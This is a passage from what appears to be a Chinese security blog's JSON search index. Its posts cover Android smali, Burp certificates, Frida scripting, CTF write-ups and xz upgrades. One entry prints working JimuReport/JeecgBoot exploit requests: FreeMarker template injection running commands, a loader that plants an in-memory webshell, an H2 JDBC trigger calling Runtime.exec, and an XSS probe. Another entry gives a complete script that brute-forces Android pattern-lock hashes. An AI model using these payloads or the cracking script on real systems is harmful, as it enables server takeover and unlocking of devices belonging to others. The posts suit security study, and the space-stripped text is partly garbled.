/os/Message;const/4v1,0x12inputv1,v0,Landroid/os/Message;-&gt;what:I此处args是Message的实例，args.what=18函数调用：函数分为directmethod和virtualmethod，简单说direct即private函数，其余的public和protected均属于virtual函数，所以在调用函数时，有invoke-direct、invoke-virtual，另外以及invoke-static、invoke-super、invoke-interface等几种不同的指令，当然还有invoke-XXX/range的指令，这是指参数多余4个的时候调用的指令；Invoke-static{v0},Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V其中{}中指定函数调用的参数值；invoke-direct{p0},Landroid/app/TabActivity;-&gt;&lt;init&gt;()V=&gt;init()invoke-virtual{v0,v1},Lcom/cc;-&gt;Message(Ljava/lang/Object;)Vinvoke-direct/range{v0,…,v5},Lcom/pb/ui/PBContainerActivity;-h(Ljava/lang/CharSequence;Ljava/lang/String;Landroid/content/Intent;l)Z在Java代码中，调用函数和返回值可以使用一条语句完成，但是在smali中需要分开来完成，如果返回的非void，需要使用move-result（返回基本数据类型）和move-result-object（返回对象）指令：const-stringv0,”Eric”invoke-static{0},Lcmd/pbi;-&gt;t(Ljava/lang/String;)Ljava/lang/String;move-result-objectv2//v2保存的就是t方法返回的值代码理解：Add-int/lit8v0,v0,0x1//将第二个v0寄存器中的值加上0x1的值，再放入第一个寄存器，实现自增长.locals4//本地寄存器4个，即v0,v1,v2,v3,v4const/4v2,0x1//4字节常量V2=1const/16v1,0x10//16字节常量v1=16.localv1,”length”:I//赋值length=v1xor-int/lit8v1,v1,0x3b//将第二个寄存器v1的值和0x3b进行异或运算，赋值给第一个v1寄存器中REFshadow-horse/Learning-resource"
  },

  {
    "title"    : "AndroidSSLProxy配置",
    "category" : "",
    "tags"     : "Android, SSLProxy, BurpSuite",
    "url"      : "/blog/2025/Android-SSLProxy/",
    "date"     : "Mar 11, 2025",
    "content"  : "Android导入burpsuite证书后拦截https请求显示服务器证书有效期太长1.说明在对android手机渗透测试时，会经常使用拦截工具拦截请求报文，其中burpsuite是比较常用的安全工具，针对Android手机配置burpsuite证书操作请参考末尾。在导入系统级证书后，拦截https报文，小程序会弹框提示连接错误：NET::ERR_CERT_VALIDITY_TOO_LONG在CA/Browser论坛发布的官方指导中有明确规定证书有效期的限定，订阅的证书在签发之后有效期不得超过60个月，在2015年4月1日之后签发的证书有效期不得大于39个月。并且针对SHA-1算法的有效期也做了限定，自2017-1-1起CA中不应该再使用SHA-1算法。9.4ValidityPeriod9.4.1SubscriberCertificatesSubscriberCertificatesissuedaftertheEffectiveDateMUSThaveaValidityPeriodnogreaterthan60months.Exceptasprovidedforbelow,SubscriberCertificatesissuedafter1April2015MUSThaveaValidityPeriodnogreaterthan39months.Beyond1April2015,CAsMAYcontinuetoissueSubscriberCertificateswithaValidityPeriodgreaterthan39monthsbutnotgreaterthan60monthsprovidedthattheCAdocumentsthattheCertificateisforasystemorsoftwarethat:(a)wasinusepriortotheEffectiveDate;(b)iscurrentlyinusebyeithertheApplicantorasubstantialnumberofRelyingParties;(c)failstooperateiftheValidityPeriodisshorterthan60months;(d)doesnotcontainknownsecurityriskstoRelyingParties;and(e)isdifficulttopatchorreplacewithoutsubstantialeconomicoutlay.ForumGuidelineCA/BrowserForumBaselineRequirements,v.1.2.3(asof16October2014)149.4.2SHA‐1ValidityPeriodEffective1January2016,CAsMUSTNOTissueanynewSubscribercertificatesorSubordinateCAcertificatesusingtheSHA-1hashalgorithm.CAsMAYcontinuetosigncertificatestoverifyOCSPresponsesusingSHA1until1January2017.ThisSection9.4.2doesnotapplytoRootCAorCAcrosscertificates.CAsMAYcontinuetousetheirexistingSHA-1RootCertificates.SHA-2SubscribercertificatesSHOULDNOTchainuptoaSHA-1SubordinateCACertificate.Effective16January2015,CAsSHOULDNOTissueSubscriberCertificatesutilizingtheSHA-1algorithmwithanExpiryDategreaterthan1January2017becauseApplicationSoftwareProvidersareintheprocessofdeprecatingand/orremovingtheSHA-1algorithmfromtheirsoftware,andtheyhavecommunicatedthatCAsandSubscribersusingsuchcertificatesdosoattheirownrisk.Burpsuite的证书有效期已经大于39个月，在AndroidChrome内核上会产生上述报错，提示证书有效期过长，如下所示：2.通过生成自定义证书的方式解决该问题方法比较简单，就是通过生成自定义的有效期小于39个月证书，然后分别导入Burpsute和Android中。生成自签名证书，采用自动生成密钥的方式，指定有效期、密钥长度，按照命令提示输入C/N等信息opensslreq-x509-nodes-days365-newkeyrsa:2048-keyoutpk.key-outcertificate.crt生成pkcs12文件，输入密钥opensslpkcs12-export-outcertificate.p12-inkeypk.key-certfilecertificate.crt-incertificate.crt导出certificate.p12文件将certificate.p12证书keystore导入Burpsuite访问http://localhost:8080下载CA证书，cacert.der转换生成pem证书，并导入Android/system/etc/security/cacerts目录下（需root权限）至此问题解决。Android手机配置burpsuite证书操作按该链接的提示进行操作即可：https://www.jianshu.com/p/521CC119F38CREFshadow-horse/Learning-resource"
  },

  {
    "title"    : "AndroidFRIDA脚本系列",
    "category" : "",
    "tags"     : "Android, FRIDA",
    "url"      : "/blog/2025/Android-Frida-Learning/",
    "date"     : "Mar 11, 2025",
    "content"  : "FRIDA脚本系列（一）入门篇：在安卓8.1上dump蓝牙接口和实例0x01.FRIDA是啥？为啥这么火？0x02.FRIDA脚本的概念0x03.简单脚本一：枚举所有的类0x04.简单脚本二：定位目标类并打印类的实例0x05.简单脚本三：枚举所有方法并定位方法0x06.综合案例：在安卓8.1上dump蓝牙接口和实例：FRIDA脚本系列（一）入门篇：在安卓8.1上dump蓝牙接口和实例0x01.FRIDA是啥？为啥这么火？frida目前非常火爆，该框架从Java层hook到Native层hook无所不能，虽然持久化还是要依靠Xposed和hookzz等开发框架，但是frida的动态和灵活对逆向以及自动化逆向的帮助非常巨大。frida是啥呢，github目录AwesomeFrida这样介绍frida的：FridaisGreasemonkeyfornativeapps,or,putinmoretechnicalterms,it’sadynamiccodeinstrumentationtoolkit.ItletsyouinjectsnippetsofJavaScriptintonativeappsthatrunonWindows,Mac,Linux,iOSandAndroid.Fridaisanopensourcesoftware.frida是平台原生app的Greasemonkey，说的专业一点，就是一种动态插桩工具，可以插入一些代码到原生app的内存空间去，（动态地监视和修改其行为），这些原生平台可以是Win、Mac、Linux、Android或者iOS。而且frida还是开源的。Greasemonkey可能大家不明白，它其实就是firefox的一套插件体系，使用它编写的脚本可以直接改变firefox对网页的编排方式，实现想要的任何功能。而且这套插件还是外挂的，非常灵活机动。frida也是一样的道理。那它为什么这么火爆呢？动静态修改内存实现作弊一直是刚需，比如金山游侠，本质上frida做的跟它是一件事情。原则上是可以用frida把金山游侠，包括CheatEngine等“外挂”做出来的。当然，现在已经不是直接修改内存就可以高枕无忧的年代了。大家也不要这样做，做外挂可是违法行为。在逆向的工作上也是一样的道理，使用frida可以“看到”平时看不到的东西。出于编译型语言的特性，机器码在CPU和内存上执行的过程中，其内部数据的交互和跳转，对用户来讲是看不见的。当然如果手上有源码，甚至哪怕有带调试符号的可执行文件包，也可以使用gbd、lldb等调试器连上去看。那如果没有呢？如果是纯黑盒呢？又要对app进行逆向和动态调试、甚至自动化分析以及规模化收集信息的话，我们需要的是细粒度的流程控制和代码级的可定制体系，以及不断对调试进行动态纠正和可编程调试的框架，这就是frida。frida使用的是python、JavaScript等“胶水语言”也是它火爆的一个原因，可以迅速将逆向过程自动化，以及整合到现有的架构和体系中去，为你们发布“威胁情报”、“数据平台”甚至“AI风控”等产品打好基础。官宣屁屁踢甚至将其敏捷开发和迅速适配到现有架构的能力作为其核心卖点。0x02.FRIDA脚本的概念FRIDA脚本就是利用FRIDA动态插桩框架，使用FRIDA导出的API和方法，对内存空间里的对象方法进行监视、修改或者替换的一段代码。FRIDA的API是使用JavaScript实现的，所以我们可以充分利用JS的匿名函数的优势、以及大量的hook和回调函数的API。我们来举个最直观的例子：hello-world.jssetTimeout(function(){Java.perform(function(){console.log(\"helloworld!\");});});这基本上就是一个FRIDA版本的“HelloWorld!”，我们把一个匿名函数作为参数传给了setTimeout()函数，然而函数体中的Java.perform()这个函数本身又接受了一个匿名函数作为参数，该匿名函数中最终会调用console.log()函数来打印一个“Helloworld！”字符串。我们需要调用setTimeout()方法因为该方法将我们的函数注册到JavaScript运行时中去，然后需要调用Java.perform()方法将函数注册到Frida的Java运行时中去，用来执行函数中的操作，当然这里只是打了一条log。然后我们在手机上将frida-server运行起来，在电脑上进行操作：$frida-U-lhello-world.jsandroid.process.media然后可以看到console.log()执行成功，字符串打印了出来。0x03.简单脚本一：枚举所有的类我们现在来给这个HelloWorld.js稍微加一点功能，比如说枚举所有已经加载的类，这就用到了Java对象的enumerateLoadedClasses方法。代码如下：setTimeout(function(){Java.perform(function(){console.log(\"\\n[*]enumeratingclasses...\");Java.enumerateLoadedClasses({onMatch:function(_className){console.log(\"[*]foundinstanceof'\"+_className+\"'\");},onComplete:function(){console.log(\"[*]classenuemrationcomplete\");}});});});首先还是确保手机上的frida-server正在运行中，然后在电脑上操作：$frida-U-lenumerate_classes.jsandroid.process.media0x04.简单脚本二：定位目标类并打印类的实例现在我们已经找到目标进程中所有已经加载的类，比如说现在我们的目标是要查看其蓝牙相关的类，我们可以把代码修改成这样：Java.enumerateLoadedClasses({onMatch:function(instance){if(instance.split(\".\")[1]==\"bluetooth\"){console.log(\"[-&gt;]\\t\"+instance);}},onComplete:function(){console.log(\"[*]classenuemrationcomplete\");}});我们来看下效果：可以找到上述这么多蓝牙相关的类。当然也可以使用字符串包含的方法，使用JavaScript字符串的indexOf()、search()或者match()方法，这个留给读者自己完成。定位到我们想要研究的类之后，就可以打印类的实例了，查看FRIDA的API手册可以得知，此时应该使用Java.choose()函数，来选定某一个实例。我们增加下列几行选定android.bluetooth.BluetoothDevice类的实例的代码。Java.choose(\"android.bluetooth.BluetoothDevice\",{onMatch:function(instance){console.log(\"[*]\"+\"android.bluetooth.BluetoothDeviceinstancefound\"+\":=&gt;'\"+instance+\"'\");bluetoothDeviceInfo(instance);},onComplete:function(){console.log(\"[*]-----\");}});在手机打开蓝牙，并且连接上我的漫步者蓝牙耳机，开始播放内容之后：在电脑上运行脚本：$frida-U-lenumerate_classes_bluetooth_choose.jscom.android.bluetooth可以看到正确检测到了我的蓝牙设备：0x05.简单脚本三：枚举所有方法并定位方法上文已经将类以及实例枚举出来，接下来我们来枚举所有方法，主要使用了Java.use()函数。Java.use()与Java.choose()最大的区别，就是在于前者会新建一个对象，后者会选择内存中已有的实例。对代码的增加如下：functionenumMethods(targetClass){\tvarhook=Java.use(targetClass);\tvarownMethods=hook.class.getDeclaredMethods();\thook.$dispose;\treturnownMethods;}......\t\tvara=enumMethods(\"android.bluetooth.BluetoothDevice\")\t\ta.forEach(function(s){\t\t\tconsole.log(s);\t\t});保持上一小节环境的情况下，在电脑上进行操作：$frida-U-lenumerate_classes_bluetooth_choose_allmethod.jscom.android.bluetooth最终效果如下，类的所有方法均被打印了出来。接下来如何“滥用”这些方法，拦截、修改参数、修改结果、等等，皆可悉听尊便，具体流程请参考0x06.综合案例：在安卓8.1上dump蓝牙接口和实例：一个比较好的综合案例，就是作为�上文案例的dump蓝牙信息的“加强版”——‘BlueCrawl’。VERSION=\"1.0.0\"setTimeout(function(){\tJava.perform(function(){\t\tJava.enumerateLoadedClasses({\t\t\t\tonMatch:function(instance){\t\t\t\t\tif(instance.split(\".\")[1]==\"bluetooth\"){\t\t\t\t\t\tconsole.log(\"[-&gt;]\\t\"+lightBlueCursor()+instance+closeCursor());\t\t\t\t\t}\t\t\t\t},\t\t\t\tonComplete:function(){}\t\t\t});\t\tJava.choose(\"android.bluetooth.BluetoothGattServer\",{\t\t\t\tonMatch:function(instance){\t\t\t\t\t...\t\t\t\tonComplete:function(){console.log(\"[*]-----\");}\t\t\t});\t\tJava.choose(\"android.bluetooth.BluetoothGattService\",{\t\t\t\tonMatch:function(instance){\t\t\t\t\t...\t\t\t\tonComplete:function(){console.log(\"[*]-----\");}\t\t\t});\t\tJava.choose(\"android.bluetooth.BluetoothSocket\",{\t\t\t\tonMatch:function(instance){\t\t\t\t\t...\t\t\t\tonComplete:function(){console.log(\"[*]-----\");}\t\t\t});\t\tJava.choose(\"android.bluetooth.BluetoothServerSocket\",{\t\t\t\tonMatch:function(instance){\t\t\t\t\t...\t\t\t\tonComplete:function(){console.log(\"[*]-----\");}\t\t\t});\t\tJava.choose(\"android.bluetooth.BluetoothDevice\",{\t\t\t\tonMatch:function(instance){\t\t\t\t\t...\t\t\t\tonComplete:function(){console.log(\"[*]-----\");}\t\t\t});\t});},0);该脚本首先枚举了很多蓝牙相关的类，然后choose了很多类，包括蓝牙接口信息以及蓝牙服务接口对象等，还加载了内存中已经分配好的蓝牙设备对象，也就是上文我们已经演示的信息。我们可以用这个脚本来“查看”App加载了哪些蓝牙的接口，App是否正在查找蓝牙设备、或者是否窃取蓝牙设备信息等。在电脑上运行命令：$frida-U-lbluecrawl-1.0.0.jscom.android.bluetooth可以看到该脚本在安卓8.1上运行良好，我们的接口和设备均被打印了出来。REF简悦SimpReadAndroidSecurityStudy"
  },

  {
    "title"    : "在棉花糖及以下版本中获取图案密码",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Get-Pattern-password-in-Marshmallow-and-below/",
    "date"     : "Feb 18, 2025",
    "content"  : "#0、解题准备需要提前准备：python2.7getekeeper-pattern.key文件#1、前提前置知识1：在早期版本(2.3-5.1)的Android手机中，锁屏密码相关的文件如下，这种类型的加密方式比较简单，只需要破解相关的SHA1的哈希值即可。/data/system/password.key/data/system/gesture.key在6.0-8.0版本的Android手机中文件加密方式则相对复杂，应该采用的是：scrypt-hash算法锁屏密码相关的文件如下/data/system/gatekeeper.pattern.key/data/system/gatekeeper.password.key#2、实操#2x01获取密码长度在/data/system/目录下的device_policies.xml文件中：&lt;?xmlversion='1.0'encoding='utf-8'standalone='yes'?&gt;&lt;policiessetup-complete=\"true\"&gt;&lt;adminname=\"com.google.android.gms/com.google.android.gms.mdm.receivers.MdmDeviceAdminReceiver\"&gt;&lt;policiesflags=\"540\"/&gt;&lt;disable-bt-contacts-sharingvalue=\"true\"/&gt;&lt;/admin&gt;&lt;active-passwordquality=\"65536\"length=\"7\"uppercase=\"0\"lowercase=\"0\"letters=\"0\"numeric=\"0\"symbols=\"0\"nonletter=\"0\"/&gt;&lt;/policies&gt;我们可以看到：length=\"7\"于是生成脚本；#3x02生成密码字典#生成所有不重复的9位密码组合withopen('password.txt','a')asfile1:forperminitertools.permutations(\"123456789\",7):#生成所有9位不重复的排列password=''.join(perm)#组合成字符串file1.write(password+'\\n')#写入文件#3x03实现对应匹配算法#ScryptLib依赖参数N=16384#CPU/内存消耗参数，控制计算复杂度r=8#块大小参数，控制内存使用p=1#并行化参数，控制并行计算的数量#读取gatekeeper.pattern.key文件withopen('gatekeeper.pattern.key','rb')asf:#以二进制模式打开文件blob=f.read()#读取文件内容到变量blob#提取关键信息s=struct.Struct('&lt;'+'17s8s32s')#定义二进制数据的解析格式：17字节字符串+8字节字符串+32字节字符串(meta,salt,signature)=s.unpack_from(blob)#从blob中解析出meta、salt和signature#读取字典文件withopen('password.txt','r')asf1:#以只读模式打开字典文件lines=f1.readlines()#读取所有行到列表lines#遍历字典尝试破解fordatainlines:password=data.strip()#去除每行首尾的空白字符（如换行符）#确保密码为二进制格式password_bytes=password.encode('utf-8')#将密码字符串编码为UTF-8格式的字节to_hash=meta+password_bytes#组合meta和密码字节，形成待哈希的数据#计算ScryptHashhash_result=scrypt.hash(to_hash,salt,N,r,p)#使用Scrypt算法计算哈希值#打印调试信息print'Passed:%s'%password#打印当前尝试的密码print'signature:%s'%signature.encode('hex')#打印签名（十六进制格式）print'Hash:%s'%hash_result[0:32].encode('hex')#打印哈希值的前32位（十六进制格式）print'Equal:%s'%(hash_result[0:32]==signature)#比较哈希值的前32位与签名是否相等ifhash_result[0:32]==signature:#如果匹配，打印成功密码并终止程序print\"Matched:%s\"%password#打印找到的密码print\"SUccess\"#打印成功信息exit(0)#退出程序#如果遍历完所有密码仍未找到匹配项print\"Unmatched...\"#打印未找到匹配密码的信息如果成功的话会输出如下：$python2crack.pyPassed:1256987signature:ef68fd098aad3083794dbebaf9190bf1d981956d8a3301aece73cdfb4ed3bd6eHash:ef68fd098aad3083794dbebaf9190bf1d981956d8a3301aece73cdfb4ed3bd6eEqual:TrueMatched:1256987Success!#3x04代码#!/usr/bin/python#-*-coding:utf-8-*-importitertoolsimportstructimportbinasciiimportscryptdefRock():N=16384r=8p=1withopen('gatekeeper.pattern.key','rb')asf:blob=f.read()s=struct.Struct('&lt;'+'17s8s32s')(meta,salt,signature)=s.unpack_from(blob)withopen('password.txt','r')asf1:lines=f1.readlines()fordatainlines:password=data.strip()password_bytes=password.encode('utf-8')to_hash=meta+password_byteshash_result=scrypt.hash(to_hash,salt,N,r,p)print'Passed:%s'%passwordprint'signature:%s'%signature.encode('hex')print'Hash:%s'%hash_result[0:32].encode('hex')print'Equal:%s'%(hash_result[0:32]==signature)ifhash_result[0:32]==signature:print\"Matched:%s\"%passwordprint\"Success!\"exit(0)print\"Unmatched...\"defPasslist():withopen('password.txt','a')asfile1:forperminitertools.permutations(\"123456789\",7):password=''.join(perm)file1.write(password+'\\n')Rock()if__name__==\"__main__\":Passlist()Python代码总结该Python脚本尝试通过暴力破解的方式，使用scrypt密钥派生函数和一个密码模式进行密码破解。它首先尝试从密码列表中匹配密码，并将生成的哈希与存储的签名进行比较，查看是否匹配。主要函数Rock()读取文件gatekeeper.pattern.key，其中包含元数据、盐值和签名。从password.txt文件中读取密码列表。对每个密码，使用scrypt函数对元数据和密码的拼接结果进行哈希计算。将计算出的哈希值与存储的签名进行比较，查看是否匹配。如果找到了匹配的密码，打印该密码并退出程序。Passlist()生成从数字1-9中取7位数的所有可能排列，并写入password.txt文件。在生成完密码列表后，调用Rock()来检查这些生成的密码。主要组件scrypt：用于密码和盐值的哈希计算，结合了内存密集型和CPU密集型的算法。itertools.permutations：用于生成从给定字符集（1-9）中取7位数的所有排列。struct：用于从gatekeeper.pattern.key文件中解析出元数据、盐值和签名。代码流程详解读取密钥(Rock())：读取gatekeeper.pattern.key文件，将其解包为三个变量：meta（17字节字符串）、salt（8字节字符串）和signature（32字节字符串）。从password.txt中读取密码列表。对于每个密码，脚本：使用scrypt函数对meta和密码（UTF-8编码）进行哈希计算。将哈希的前32字节与存储的签名进行比较。如果哈希值与签名匹配，则打印出密码，并退出程序。生成密码列表(Passlist())：该函数使用itertools.permutations生成所有可能的7位数排列，字符集为\"123456789\"，并将它们写入password.txt文件。生成完密码列表后，调用Rock()来检查这些生成的密码。外部库scrypt：用于密钥派生函数，结合盐值和密码生成哈希值。itertools：用于生成密码的排列组合。struct：用于解析二进制数据。注意事项WindowsError:[Error126]ps&gt;python2.\\crypt.pyTraceback(mostrecentcalllast):File\".\\crypt.py\",line4,in&lt;module&gt;importscryptFile\"C:\\Python27\\lib\\site-packages\\scrypt.py\",line11,in&lt;module&gt;_scrypt=cdll.LoadLibrary(imp.find_module('_scrypt')[1])File\"C:\\Python27\\lib\\ctypes\\__init__.py\",line444,inLoadLibraryreturnself._dlltype(name)File\"C:\\Python27\\lib\\ctypes\\__init__.py\",line366,in__init__self._handle=_dlopen(self._name,mode)WindowsError:[Error126]需要使用下面的命令安装scrypt库：python2-mpipinstallscrypt==0.8.11REFCrackinggatekeeper.pattern.key &#8617;"
  },

  {
    "title"    : "zh",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/",
    "date"     : "Feb 1, 2025",
    "content"  : "ThisarticleisavailableinEnglish.使用Git要在命令行上使用Git，您需要在计算机上下载、安装和配置Git。您也可以从命令行安装以使用。有关更多信息，请参阅：“关于”。如果您想在本地使用Git，但不想使用命令行，您可以下载并安装客户端。有关更多信息，请参阅“安装和配置”。如果您不需要在本地处理文件，可以让您直接在浏览器中完成许多与Git相关的操作，包括：仓库快速入门为存储库创建分支管理文件在Github上寻找灵感设置Git下载并安装最新版本的Git。注意：如果您使用的是ChromeOS设备，则需要进行额外设置：在您的ChromeOS设备上从GooglePlayStore安装终端仿真器（例如Termux）。从您安装的终端仿真器安装Git。例如，在Termux中输入aptinstallgit，然后在出现提示时输入y。在Git中设置用户名设置提交电子邮件地址从Git进行身份验证当您从Git连接到存储库时，您将需要使用HTTPS或SSH进行身份验证。注意：您可以使用,对于HTTP或SSH进行身份验证。有关更多信息，请参阅ghauth登录。通过HTTPS连接（推荐）如果您使用HTTPS克隆，则可以使用凭据助手在Git中缓存凭据。有关更多信息，请参阅：“使用HTTPSURL克隆”“在Git中缓存GitHub凭据”。通过SSH连接如果您使用SSH克隆，则必须在用于推送或拉取的每台计算机上生成SSH密钥。有关更多信息，请参阅：“使用SSHURL克隆”“生成新的SSH密钥并将其添加到ssh-agent”。后续步骤您现在已拥有Git并已完成所有设置。您现在可以选择创建一个存储库来放置您的项目。将代码保存在存储库中可让您备份代码并将其与全世界共享。"
  },

  {
    "title"    : "2024年网鼎杯玄武组赛题历程",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/WANGDINGCTF2024-Walkthrough/",
    "date"     : "Dec 15, 2024",
    "content"  : "1、MISC011.1、赛题描述1.2、解题思路根据提示寻找异常GTP协议中异常的teid，将teid作为列导出所有GTP流量：生成csv文件如下，在GTP报文中，TEID应该是唯一的，确保报文的正确解析和处理，多个TEID的存在可能会被视为攻击迹象，例如：重放攻击或伪造报文，发现构造的teid如下：根据提示排列生成flag：wdflag{1934614239214098}2、MISC042.1、赛题描述2.2、解题思路binwalk分析使用binwalk分析文件，发现1文件为zip文件，并附第一张翻转图片和密码，提醒需要爆破四位数：生成字典后，利用爆破出正确用户名密码：使用图片crc计算工具暴力破解获得图片：成功获取到flag。wdflag{1234576eee739d811904bea4860s4eg5}3、…"
  },

  {
    "title"    : "JimuReport Vuln WalkThrough backup",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/JimuReport-Vuln-WalkThrough-backup/",
    "date"     : "Aug 1, 2024",
    "content"  : "REFxzcommunity::JimuReport＜=v1.6.0漏洞分析Github:wy876:https://github.com/wy876/POC/blob/main/JeecgBoot%E6%BC%8F%E6%B4%9E.mdGithub:wy876:JeecgBoot反射型XSS漏洞JeecgBootsql注入漏洞POST/jeecg-boot/jmreport/queryFieldBySqlHTTP/1.1Host:192.168.90.1:3100Origin:http://192.168.90.1:3100User-Agent:Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/115.0.0.0Safari/537.36Accept:*/*Accept-Encoding:gzip,deflateAccept-Language:zh-CN,zh;q=0.9Connection:closeContent-Type:application/jsonContent-Length:123{\"sql\":\"select'result:&lt;#assignex=\\\"freemarker.template.utility.Execute\\\"?new()&gt;${ex(\\\"open-acalculator.app\\\")}'\"}queryFieldBySql注入内存马{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval(\\\"classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('org.apachen.SOAPUtils').newInstance();}catch(e){clsString=classLoader.loadClass('java.lang.String');bytecodeBase64='这里填入base64的内存马';try{clsBase64=classLoader.loadClass('java.util.Base64');clsDecoder=classLoader.loadClass('java.util.Base64$Decoder');decoder=clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode=clsDecoder.getMethod('decode',clsString).invoke(decoder,bytecodeBase64);}catch(ee){try{datatypeConverterClz=classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode=datatypeConverterClz.getMethod('parseBase64Binary',clsString).invoke(datatypeConverterClz,bytecodeBase64);}catch(eee){clazz1=classLoader.loadClass('sun.misc.BASE64Decoder');bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);}}clsClassLoader=classLoader.loadClass('java.lang.ClassLoader');clsByteArray=(''.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod('defineClass',[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();};#{1};\\\")}\",\"dbSource\":\"\",\"type\":\"0\"}使用内存马工具生成payload，将生成的base64格式的内存马替换payload中bytecodeBase64的值内存马路径：http://192.168.18.131:8080/jeecg-boot/jmreport/queryFieldBySql/JeecgBootSSTI漏洞POST/jeecgboot/jmreport/testConnectionHTTP/1.1Host:192.168.90.1:3100Content-Length:383Accept:application/json,text/plain,*/*User-Agent:Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/115.0.0.0Safari/537.36Content-Type:application/json;charset=UTF-8Origin:http://192.168.90.1:3100Referer:http://192.168.90.1:3100/login?redirect=/dashboard/analysisAccept-Encoding:gzip,deflateAccept-Language:zh-CN,zh;q=0.9Connection:close{\"id\":\"1\",\"code\":\"dataSource1\",\"dbType\":\"H2\",\"dbDriver\":\"org.h2.Driver\",\"dbUrl\":\"jdbc:h2:mem:test;init=CREATETRIGGERshellBEFORESELECTONINFORMATION_SCHEMA.TABLESAS$$//javascript\\u000A\\u0009java.lang.Runtime.getRuntime().exec('open-acalculator.app')\\u000A$$\",\"dbName\":\"test\",\"dbUsername\":\"sa\",\"dbPassword\":\"\",\"connectTimes\":5}漏洞分析https://c0olw.github.io/2023/08/15/JeecgBoot-SSTI%E4%BB%A5%E5%8F%8AJDBC-RCE/JeecgBoot反射型XSS漏洞GET/userController.do?%3CsCrIpT%3Ealert(document.domain)%3C/sCrIpT%3EHTTP/1.1Host:User-Agent:Mozilla/5.0(Macintosh;IntelMacOSX10.15;rv:126.0)Gecko/20100101Firefox/126.0"
  },

  {
    "title"    : "「macOS」更新XZ | Upgrade Your XZ Version",
    "category" : "",
    "tags"     : "XZ, Supply Chain Poisoning",
    "url"      : "/blog/2024/Upgrade-Your-XZ-Version/",
    "date"     : "Jul 18, 2024",
    "content"  : "5.6.2(2024-05-29)https://github.com/tukaani-project/xz/releases/tag/v5.6.2changelogRemovethebackdoor(CVE-2024-3094).Notchanged:Memorysanitizer(MSAN)hasafalsepositiveintheCRCCLMULcodewhichalsomakesOSSFuzzunhappy.Valgrindissmarteranddoesn’tcomplain.…效果图1.使用Homebrew安装最新版本通常情况下，安装最新版本的XZ可能是一个更好的选择，特别是如果您不需要特定版本的特定功能或修复。brewinstallxz这将安装Homebrew中可用的最新版本的XZ。2.手动下载和安装特定版本如果您非常需要特定版本的XZ，可以手动下载该版本的源代码并进行编译和安装。步骤如下：前往TukaaniXZGithub，找到并下载您需要的特定版本的源代码（例如，xz-5.2.5.tar.gz）。解压缩下载的源代码包：tar-xzvfxz-5.6.2.tar.gzcdxz-5.6.2编译和安装：./configuremakesudomakeinstall验证安装：xz--version"
  },

  {
    "title"    : "「OBS on MacOS13」:（悠雅de）录制桌面声音",
    "category" : "",
    "tags"     : "MacOS13, OBS",
    "url"      : "/blog/2022/Record-Sounds-in-macOS13-by-OBS/",
    "date"     : "Dec 13, 2022",
    "content"  : "解决问题：使用命令打开OBS后存在终端。添加OBS声音目前使用的MacOS13，由于新版系统权限问题，OBS无法自动取得桌面声音，只能依靠第三方软件1我这里用的是iShowU，参考1中使用的是soundflower，应该操作都差不多；然后需要在终端中执行添加参数快捷方式的命令才能录制桌面声音：open/Applications/OBS.app/Contents/MacOS/OBS--args-picture解决使用自动操作即可，基本操作可以查看参考2。运行shell打开自动操作-&gt;运行shell脚本-&gt;填入以下：cd/Applications/OBS.app/Contents/MacOS/&amp;&amp;nohup./OBS--args-picture-Xdock:icon=/Applications/OBS.app/Contents/Resources/AppIcon.icns&amp;美化然后拖进Dock栏运行即可，就不会存在终端了。不过需要注意的是，这种方式是通过自动操作app运行的OBS，所以需要额外赋（屏幕录制+麦克风）权限给自动操作。REFmacOS下OBS没有桌面声音且不录音 &#8617;MacOSX中带参数启动应用程序（如Chrome）的方法比较 &#8617;"
  },

  {
    "title"    : "OpenliteSpeed CVE-2022-0072 Vulns",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/2022-11-23-openlitespeed-cve-vuln-walkthrough/",
    "date"     : "Nov 23, 2022",
    "content"  : "[*]MarkCVE-2022-00721所示的OpenLiteSpeedWeb目录穿越漏洞2Githubcommit记录所示3：RewriteRule4\"RewriteCond%{REQUEST_URI}!^/(index|login)\\\\.php$\\n\"\"RewriteCond%{REQUEST_URI}!^/view/(serviceMgr|confMgr|ajax_data|dashboard|logviewer|compilePHP|realtimestats)\\\\.php$\\n\"\"RewriteRule\\\\.php-[F]\\n\";REFFullDisclosureofCVE-2022-0072,CVE-2022-0073,andCVE-2022-0074andWhatYouShouldDo &#8617;OpenLiteSpeedWeb服务器被曝多个严重性漏洞 &#8617;openlitespeed/::1.7.16.1::commit &#8617;Apache正则表达式-RewriteRule和RewriteCond规则参数的详细介绍 &#8617;"
  },

  {
    "title"    : "「Jekyll开发美化」:如何添加访客次数 II（以翻页钟样式为例）",
    "category" : "",
    "tags"     : "Development, Jekyll, CSS, JavaScript",
    "url"      : "/blog/2022/Jekyll-devOps-how-to-add-vistor-and-times-II/",
    "date"     : "Nov 21, 2022",
